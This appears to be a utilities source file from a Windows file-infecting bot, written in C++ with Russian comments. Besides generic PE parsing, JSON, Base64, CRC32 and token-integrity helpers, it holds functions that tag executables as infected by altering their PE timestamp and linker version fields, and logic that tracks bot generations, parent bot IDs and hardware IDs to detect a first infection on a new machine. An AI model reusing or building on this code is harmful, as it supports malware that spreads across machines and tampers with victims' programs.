#include "utils.hpp"

DWORD dwGetFileArchitecture(PIMAGE_DOS_HEADER pFileBase)
{
	if (pFileBase->e_magic != IMAGE_DOS_SIGNATURE)
	{
#ifdef _DEBUG
		WriteLog(L"[dwGetFileArhitecture] file invalid dos signature");
#endif
		return 0;
	}

	// IMAGE_NT_HEADERS 32 и 64 отличаются только опциональным заголовком, они идентичны вплоть до файлового заголовка включительно
	// поэтому мы можем использовать хидер любой разрядности для проверки этих полей
	UINT_PTR pNtHeaders = (UINT_PTR)((SIZE_T)pFileBase + (SIZE_T)pFileBase->e_lfanew);
	PIMAGE_NT_HEADERS32 pNt32 = (PIMAGE_NT_HEADERS32)pNtHeaders;
	if (pNt32->Signature != IMAGE_NT_SIGNATURE)
	{
#ifdef _DEBUG
		WriteLog(L"[dwGetFileArhitecture] file invalid NT signature");
#endif
		return 0;
	}

	return pNt32->FileHeader.Machine;
}

VOID _RtlCopyMemory(LPBYTE target, LPBYTE from, SIZE_T dwSize)
{
	for (UINT i = 0; i < dwSize; i++)
		target[i] = from[i];
	return;
}

DWORD GetPEHeadersSize(HANDLE hFile, DWORD dwArch)
{
	LARGE_INTEGER liMoveDistance;
	RtlSecureZeroMemory(&liMoveDistance, sizeof(liMoveDistance));
	if (!SetFilePointerEx(hFile, liMoveDistance, NULL, FILE_BEGIN))
		return 0;

	UINT_PTR pNtHeaders = NULL;
	DWORD dwReadSize = 2 * 1024;
	DWORD dwRead = 0;

	DWORD dwResult = 0;
	LPBYTE lpBeginHeaders = nullptr;
	do
	{
		lpBeginHeaders = new BYTE[dwReadSize + 1];
		if (lpBeginHeaders == nullptr)
			break;

		if (!ReadFile(hFile, lpBeginHeaders, dwReadSize, &dwRead, NULL))
			break;

		PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBeginHeaders;
		pNtHeaders = (UINT_PTR)((SIZE_T)pDos + (SIZE_T)pDos->e_lfanew);

		switch (dwArch)
		{
		case IMAGE_FILE_MACHINE_I386:
			dwResult = ((PIMAGE_NT_HEADERS32)pNtHeaders)->OptionalHeader.SizeOfHeaders;
			break;
		case IMAGE_FILE_MACHINE_AMD64:
			dwResult = ((PIMAGE_NT_HEADERS64)pNtHeaders)->OptionalHeader.SizeOfHeaders;
			break;
		default:
			break;
		}

	} while (FALSE);

	if (lpBeginHeaders != nullptr)
		delete[]lpBeginHeaders;

	return dwResult;
}

DWORD align(DWORD n, DWORD a)
{
	if (n % a == 0)
		return n;
	DWORD r = (n / a) * a + a;
	return r;
}


DWORD Rva2Offset(BOOL b64, DWORD dwRva, UINT_PTR uiBaseAddress)
{
	WORD wIndex = 0;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	PIMAGE_NT_HEADERS32 pNtHeaders32 = NULL;
	PIMAGE_NT_HEADERS64 pNtHeaders64 = NULL;

	if (b64 == FALSE)
		pNtHeaders32 = (PIMAGE_NT_HEADERS32)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);
	else
		pNtHeaders64 = (PIMAGE_NT_HEADERS64)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

	if (b64 == FALSE)
		pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders32->OptionalHeader) + pNtHeaders32->FileHeader.SizeOfOptionalHeader);
	else
		pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders64->OptionalHeader) + pNtHeaders64->FileHeader.SizeOfOptionalHeader);

	if (dwRva < pSectionHeader[0].PointerToRawData)
		return dwRva;

	if (b64 == FALSE)
	{
		for (wIndex = 0; wIndex < pNtHeaders32->FileHeader.NumberOfSections; wIndex++)
		{
			if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
				return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
		}
	}
	else
	{
		for (wIndex = 0; wIndex < pNtHeaders64->FileHeader.NumberOfSections; wIndex++)
		{
			if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
				return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
		}
	}

	return 0;
}

int _cdecl _rand(long *holdrand)
{
	return (((*holdrand = *holdrand * 214013L + 2531011L) >> 16) & 0x7fff);
}

BOOL isInfected(PIMAGE_DOS_HEADER pFileBase, DWORD dwFileArch)
{
	UINT_PTR pNtHeaders = (UINT_PTR)((SIZE_T)pFileBase + (SIZE_T)pFileBase->e_lfanew);

	DWORD dwTimestamp = 0;
	BYTE MinorLinkerVersion = 0;
	BYTE MajorLinkerVersion = 0;

	switch (dwFileArch)
	{
	case IMAGE_FILE_MACHINE_I386:
		dwTimestamp = ((PIMAGE_NT_HEADERS32)pNtHeaders)->FileHeader.TimeDateStamp;
		MinorLinkerVersion = ((PIMAGE_NT_HEADERS32)pNtHeaders)->OptionalHeader.MinorLinkerVersion;
		MajorLinkerVersion = ((PIMAGE_NT_HEADERS32)pNtHeaders)->OptionalHeader.MajorLinkerVersion;
		break;
	case IMAGE_FILE_MACHINE_AMD64:
		dwTimestamp = ((PIMAGE_NT_HEADERS64)pNtHeaders)->FileHeader.TimeDateStamp;
		MinorLinkerVersion = ((PIMAGE_NT_HEADERS64)pNtHeaders)->OptionalHeader.MinorLinkerVersion;
		MajorLinkerVersion = ((PIMAGE_NT_HEADERS64)pNtHeaders)->OptionalHeader.MajorLinkerVersion;
		break;
	}

	// если dwTimestamp выравнен по 0xFFFF0000 и xor минорной и мажорной версии линкера равен 0xEA, то файл заражен
	return (((dwTimestamp & ALIGN_INF_FLAG) == dwTimestamp) && ((MajorLinkerVersion ^ MinorLinkerVersion) == XOR_FLAG));
}

VOID SetHeaderInfected(PIMAGE_DOS_HEADER pFileBase, DWORD dwFileArch)
{
	UINT_PTR pNtHeaders = (UINT_PTR)((SIZE_T)pFileBase + (SIZE_T)pFileBase->e_lfanew);

	DWORD dwTimestamp = 0;
	BYTE MinorLinkerVersion = 0;
	BYTE MajorLinkerVersion = 0;

	switch (dwFileArch)
	{
	case IMAGE_FILE_MACHINE_I386:
		dwTimestamp = ((PIMAGE_NT_HEADERS32)pNtHeaders)->FileHeader.TimeDateStamp;
		MinorLinkerVersion = ((PIMAGE_NT_HEADERS32)pNtHeaders)->OptionalHeader.MinorLinkerVersion;
		MajorLinkerVersion = ((PIMAGE_NT_HEADERS32)pNtHeaders)->OptionalHeader.MajorLinkerVersion;
		break;
	case IMAGE_FILE_MACHINE_AMD64:
		dwTimestamp = ((PIMAGE_NT_HEADERS64)pNtHeaders)->FileHeader.TimeDateStamp;
		MinorLinkerVersion = ((PIMAGE_NT_HEADERS64)pNtHeaders)->OptionalHeader.MinorLinkerVersion;
		MajorLinkerVersion = ((PIMAGE_NT_HEADERS64)pNtHeaders)->OptionalHeader.MajorLinkerVersion;
		break;
	}

	// выравнивание таймстампа как индикатор зараженности
	dwTimestamp &= ALIGN_INF_FLAG;
	// новое значение MinorLinkerVersion, проверка на зараженность будет MinorLinkerVersion ^ MajorLinkerVersion == XOR_FLAG
	MinorLinkerVersion = MajorLinkerVersion ^ XOR_FLAG;

	switch (dwFileArch)
	{
	case IMAGE_FILE_MACHINE_I386:
		((PIMAGE_NT_HEADERS32)pNtHeaders)->FileHeader.TimeDateStamp = dwTimestamp;
		((PIMAGE_NT_HEADERS32)pNtHeaders)->OptionalHeader.MinorLinkerVersion = MinorLinkerVersion;
		break;
	case IMAGE_FILE_MACHINE_AMD64:
		((PIMAGE_NT_HEADERS64)pNtHeaders)->FileHeader.TimeDateStamp = dwTimestamp;
		((PIMAGE_NT_HEADERS64)pNtHeaders)->OptionalHeader.MinorLinkerVersion = MinorLinkerVersion;
		break;
	}

	return;
}

void shuffle(long * holdrand, LPINT lpArray, SIZE_T dwElements)
{
	if (dwElements > 1)
	{
		SIZE_T i;
		for (i = 0; i < dwElements - 1; i++)
		{
			SIZE_T j = i + _rand(holdrand) / (RAND_MAX / (dwElements - i) + 1);
			int t = lpArray[j];
			lpArray[j] = lpArray[i];
			lpArray[i] = t;
		}
	}
	return;
}

BOOL is_machine_firstexec()
{
	// если поколение == 0 или parentBotId пустой, то это однозначно первый вход на машину
	if ((global_data::pExtendedDataCopy->dwGenCounter == 0) || (global_data::pExtendedDataCopy->parentBotId[0] == L'\0'))
	{
#ifdef _DEBUG
		WriteLog(L"[is_machine_firstexec] zero generation, first entry to machine");
#endif
		return TRUE;
	}

	// теперь сравним hid текущего бота с первыми байтами соответствующей длины у parentBotId, и если они не равны, то это первый вход на машину
	if (_wcsnicmp(global_data::pExtendedDataCopy->parentBotId, global_data::pwHardwareID, wcslen(global_data::pwHardwareID)) != 0)
	{
#ifdef _DEBUG
		WriteLog(L"[is_machine_firstexec] hid != first hid-bytes of parentbid, first entry to machine");
#endif
		return TRUE;
	}

#ifdef _DEBUG
	WriteLog(L"[is_machine_firstexec] gen > 0 and hid part of parentbid is equal to hid, so it is not the first entry to machine");
#endif

	return FALSE;
}


// ищет keyword_name в джсоне и проверяет равен ли он value_json
// если такого кейворда нет или он равен другому значению, то возвращает фолс
BOOL isKeywordEqualTo(PCHAR pchJson, jfes_token_t * tokens, jfes_size_t amount, unsigned char * keyword_name, unsigned char * value_json, jfes_size_t start_index, jfes_size_t * out_location_index)
{
	int keyword_len = strlen((const char*)keyword_name);
	int value_len = strlen((const char*)value_json);

	for (jfes_size_t i = start_index; i < amount; i++)
	{
		// найдем кейворд
		jfes_token_t token = tokens[i];
		if ((token.type == jfes_type_string) && (token.end - token.start == keyword_len) && (_RtlCompareMemory((LPBYTE)&pchJson[token.start], keyword_name, keyword_len)))
		{
			// проверим что значение равно нашему
			if (i + 1 != amount)
			{
				token = tokens[i + 1];
				if ((token.type == jfes_type_string) && (token.end - token.start == value_len) && (_RtlCompareMemory((LPBYTE)&pchJson[token.start], value_json, value_len)))
				{
					if (out_location_index != nullptr)
						*out_location_index = i;

					return TRUE;
				}
			}
		}
	}

	return FALSE;
}

BOOL _RtlCompareMemory(LPBYTE lpFirst, LPBYTE lpSecond, SIZE_T dwSize)
{
	for (UINT i = 0; i < dwSize; i++)
	{
		if (lpFirst[i] != lpSecond[i])
			return FALSE;
	}
	return TRUE;
}


PCHAR getStringFromKeyword(PCHAR pchJson, jfes_token_t * tokens, jfes_size_t amount, unsigned char * keyword_name, jfes_size_t start_index, jfes_size_t * out_location_index)
{
	int keyword_len = strlen((const char*)keyword_name);
	PCHAR pResult = nullptr;

	for (jfes_size_t i = start_index; i < amount; i++)
	{
		jfes_token_t token = tokens[i];
		if ((token.type == jfes_type_string) && (token.end - token.start == keyword_len) && (_RtlCompareMemory((LPBYTE)&pchJson[token.start], keyword_name, keyword_len)))
		{
			if (i + 1 != amount)
			{
				token = tokens[i + 1];
				if (token.type == jfes_type_string)
				{
					if (out_location_index != nullptr)
						*out_location_index = i;

					int pResultSize = token.end - token.start;
					pResult = new CHAR[pResultSize + 1];
					if (pResult != nullptr)
					{
						RtlSecureZeroMemory(pResult, pResultSize + 1);
						_RtlCopyMemory((LPBYTE)pResult, (LPBYTE)&pchJson[token.start], pResultSize);
						break;
					}
				}
			}
		}
	}

	return pResult;
}

BOOL isKeywordExist(PCHAR pchJson, jfes_token_t * tokens, jfes_size_t amount, unsigned char * keyword_name, jfes_size_t start_index, jfes_size_t * out_location_index)
{
	int keyword_len = strlen((const char*)keyword_name);

	for (jfes_size_t i = start_index; i < amount; i++)
	{
		// найдем кейворд
		jfes_token_t token = tokens[i];
		if ((token.type == jfes_type_string) && (token.end - token.start == keyword_len) && (_RtlCompareMemory((LPBYTE)&pchJson[token.start], keyword_name, keyword_len)))
		{
			if (out_location_index != nullptr)
				*out_location_index = i;
			return TRUE;
		}
	}
	return FALSE;
}

VOID AddSlash(PWCHAR pwFilePath)
{
	UINT uLen = wcslen(pwFilePath);
	pwFilePath[uLen] = L'\\';
	pwFilePath[uLen + 1] = L'\0';
	return;
}


// ищет keyword и возвращает true если он присутствует, false если начиная с такого индекса его нет
BOOL isKeywordExist(PCHAR pchJson, jfes_token_t *tokens, jfes_size_t amount, unsigned char *keyword_name, jfes_size_t start_index)
{
	return isKeywordExist(pchJson, tokens, amount, keyword_name, start_index, nullptr);
}


// ищет keyword_name в джсоне и проверяет равен ли он value_json
// если такого кейворда нет или он равен другому значению, то возвращает фолс
BOOL isKeywordEqualTo(PCHAR pchJson, jfes_token_t *tokens, jfes_size_t amount, unsigned char *keyword_name, unsigned char *value_json, jfes_size_t start_index)
{
	return isKeywordEqualTo(pchJson, tokens, amount, keyword_name, value_json, start_index, nullptr);
}

// находит и keyword и создает в памяти буфер с его содержимым, если такого кейворда нет, то возвращает NULL
PCHAR getStringFromKeyword(PCHAR pchJson, jfes_token_t *tokens, jfes_size_t amount, unsigned char *keyword_name, jfes_size_t start_index)
{
	return getStringFromKeyword(pchJson, tokens, amount, keyword_name, start_index, nullptr);
}

BOOL Convert2UTF16LE(PCHAR pchFrom, PWCHAR pwchTo, DWORD dwBufferSize)
{
	BOOL bRet = FALSE;
	INT iRequiredSize = 0;
	do
	{
		iRequiredSize = MultiByteToWideChar(CP_UTF8, 0, pchFrom, -1, nullptr, iRequiredSize);
		if ((iRequiredSize <= 0) || (iRequiredSize > dwBufferSize))
			break;

		iRequiredSize = MultiByteToWideChar(CP_UTF8, 0, pchFrom, -1, pwchTo, iRequiredSize);
		if (iRequiredSize > 0)
			bRet = TRUE;

	} while (FALSE);

	return bRet;
}

PCHAR Convert2UTF8(PWCHAR pwStr, SIZE_T dwLen)
{
	int utf8_len = WideCharToMultiByte(CP_UTF8, 0, pwStr, dwLen, NULL, 0, NULL, NULL);
	if (utf8_len == 0)
		return nullptr;

	PCHAR pResult = new CHAR[utf8_len + 1];
	if (pResult == nullptr)
		return nullptr;

	RtlSecureZeroMemory(pResult, utf8_len + 1);

	WideCharToMultiByte(CP_UTF8, 0, pwStr, dwLen, pResult, utf8_len, 0, 0);

	return pResult;
}

LPBYTE Base64toBinary(PCHAR pchBase64, PSIZE_T dwOutSize)
{
	LPBYTE lpResult = nullptr;

	if (!CryptStringToBinaryA(pchBase64, NULL, CRYPT_STRING_BASE64, NULL, (PDWORD)dwOutSize, NULL, NULL))
	{
#ifdef _DEBUG
		WriteLog(L"[Base64ToBinary] error cant get needed size");
#endif
		return nullptr;
	}

	if (*dwOutSize == 0)
		return nullptr;

	lpResult = new BYTE[*dwOutSize + 1];
	if (lpResult == nullptr)
		return nullptr;

	if (!CryptStringToBinaryA(pchBase64, NULL, CRYPT_STRING_BASE64, lpResult, (PDWORD)dwOutSize, NULL, NULL))
	{
#ifdef _DEBUG
		WriteLog(L"[Base64ToBinary] error cant decode string");
#endif
		delete[]lpResult;
		lpResult = nullptr;
		return nullptr;
	}

	return lpResult;
}

static UINT crc32_for_byte(DWORD r) {
	for (int j = 0; j < 8; ++j)
		r = (r & 1 ? 0 : (DWORD)0xEDB88320L) ^ r >> 1;
	return r ^ (DWORD)0xFF000000L;
}

/* Any unsigned integer type with at least 32 bits may be used as
* accumulator type for fast crc32-calulation, but unsigned long is
* probably the optimal choice for most systems. */
typedef unsigned long accum_t;

static void init_tables(DWORD* table, DWORD* wtable) {
	for (size_t i = 0; i < 0x100; ++i)
		table[i] = crc32_for_byte(i);
	for (size_t k = 0; k < sizeof(accum_t); ++k)
		for (size_t w, i = 0; i < 0x100; ++i) {
			for (size_t j = w = 0; j < sizeof(accum_t); ++j)
				w = table[(BYTE)(j == k ? w ^ i : w)] ^ w >> 8;
			wtable[(k << 8) + i] = w ^ (k ? wtable[0] : 0);
		}
}

void crc32_calculator(const void* data, size_t n_bytes, PDWORD crc) {
	// тут следовало бы юзать статик переменные, но убрал из имплементации, так как потокобезопасность же
	DWORD table[0x100], wtable[0x100 * sizeof(accum_t)];
	size_t n_accum = n_bytes / sizeof(accum_t);

	init_tables(table, wtable);

	for (size_t i = 0; i < n_accum; ++i) {
		accum_t a = *crc ^ ((accum_t*)data)[i];
		for (size_t j = *crc = 0; j < sizeof(accum_t); ++j)
			*crc ^= wtable[(j << 8) + (BYTE)(a >> 8 * j)];
	}
	for (size_t i = n_accum * sizeof(accum_t); i < n_bytes; ++i)
		*crc = table[(BYTE)*crc ^ ((BYTE*)data)[i]] ^ *crc >> 8;

	return;
}

DWORD dwCurrentProcessIntegrityLevel()
{
	DWORD dwRet = 0;
	HANDLE hTokenHandle = NULL;
	DWORD dwInfoSize = 0;
	PTOKEN_MANDATORY_LABEL ptml = nullptr;
	do
	{
		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTokenHandle))
		{
#ifdef _DEBUG
			WriteLog(L"[dwCurrentProcessIntegrityLevel] error cant open current process token");
#endif
			break;
		}

		if ((GetTokenInformation(hTokenHandle, TokenIntegrityLevel, nullptr, 0, &dwInfoSize)) || (GetLastError() != ERROR_INSUFFICIENT_BUFFER))
		{
#ifdef _DEBUG
			WriteLog(L"[dwCurrentProcessIntegrityLevel] error GetTokenInformation undefined behaivor");
#endif
			break;
		}

		ptml = (PTOKEN_MANDATORY_LABEL)new BYTE[dwInfoSize + 1];

		if (!GetTokenInformation(hTokenHandle, TokenIntegrityLevel, ptml, dwInfoSize, &dwInfoSize))
		{
#ifdef _DEBUG
			WriteLog(L"[dwCurrentProcessIntegrityLevel] error cant get current token information");
#endif
			break;
		}

		dwRet = *GetSidSubAuthority(ptml->Label.Sid, (DWORD)(*GetSidSubAuthorityCount(ptml->Label.Sid) - 1));

#ifdef _DEBUG
		WCHAR debugOut[1024];
		wsprintfW(debugOut, L"[dwCurrentProcessIntegrityLevel] current integrity is 0x%X ", dwRet);
		if (dwRet < SECURITY_MANDATORY_LOW_RID)
			wcscat(debugOut, L"UNTRUSTED LEVEL");
		else if ((dwRet >= SECURITY_MANDATORY_LOW_RID) && (dwRet < SECURITY_MANDATORY_MEDIUM_RID))
			wcscat(debugOut, L"LOW LEVEL");
		else if ((dwRet >= SECURITY_MANDATORY_MEDIUM_RID) && (dwRet < SECURITY_MANDATORY_HIGH_RID))
			wcscat(debugOut, L"MEDIUM LEVEL");
		else if ((dwRet >= SECURITY_MANDATORY_HIGH_RID) && (dwRet < SECURITY_MANDATORY_SYSTEM_RID))
			wcscat(debugOut, L"HIGH LEVEL");
		else if (dwRet >= SECURITY_MANDATORY_SYSTEM_RID)
			wcscat(debugOut, L"SYSTEM LEVEL");
		else
			wcscat(debugOut, L"UNKNOWN LEVEL");
		WriteLog(debugOut);
#endif
		
	} while (FALSE);

	if (ptml != nullptr)
		delete[]ptml;

	if (hTokenHandle != NULL)
		CloseHandle(hTokenHandle);

	return dwRet;
}

static INT getNextCharIndex(PWCHAR pwchString, WCHAR wchCharacter, DWORD dwIndexBegin)
{
	INT iCharBegin = dwIndexBegin;

	while (pwchString[iCharBegin] != L'\0')
	{
		if (pwchString[iCharBegin] == wchCharacter)
			return iCharBegin;

		iCharBegin++;
	}

	return -1;
}

#ifdef _DEBUG_CMD
PWCHAR WriteLogcmd::GetStrParamOperand(PWCHAR pwCommandLine, PWCHAR pwParameter)
{
	PWCHAR pwFirstOccur = StrStrW(pwCommandLine, pwParameter);
	if (pwFirstOccur == NULL)
		return nullptr;

	PWCHAR pwchResult = nullptr;
	do
	{

		INT iCharBegin = getNextCharIndex(pwFirstOccur, L'\"', 0);
		if (iCharBegin == -1)
			break; // нет начальной кавычки


		INT iCharEnd = getNextCharIndex(pwFirstOccur, L'\"', iCharBegin + 1);
		if (iCharEnd == -1)
			break; // нет завершающей кавычки

		SIZE_T dwTotalCharsAmount = (iCharEnd - iCharBegin) - 1;
		if (dwTotalCharsAmount == 0)
			break; // между кавычками нет символов

		pwchResult = new WCHAR[dwTotalCharsAmount + 1];
		if (pwchResult == nullptr)
			break;

		UINT iIndexResult = 0;
		for (UINT iCommandLineIndex = iCharBegin + 1; iCommandLineIndex < iCharEnd; iCommandLineIndex++)
			pwchResult[iIndexResult++] = pwFirstOccur[iCommandLineIndex];


	} while (FALSE);

	return pwchResult;
}

BOOL WriteLogcmd::isParamExists(PWCHAR pwCommandLine, PWCHAR pwParameter)
{
	return (StrStrW(pwCommandLine, pwParameter) != NULL);
}

BOOL WriteLogcmd::GetIntParamOperand(PWCHAR pwCommandLine, PWCHAR pwParameter, INT *iOutput)
{
	PWCHAR pwchNumber = GetStrParamOperand(pwCommandLine, pwParameter);
	if (pwchNumber == nullptr)
		return FALSE;

	*iOutput = _wtoi(pwchNumber);

	delete[]pwchNumber;

	return TRUE;
}
#endif
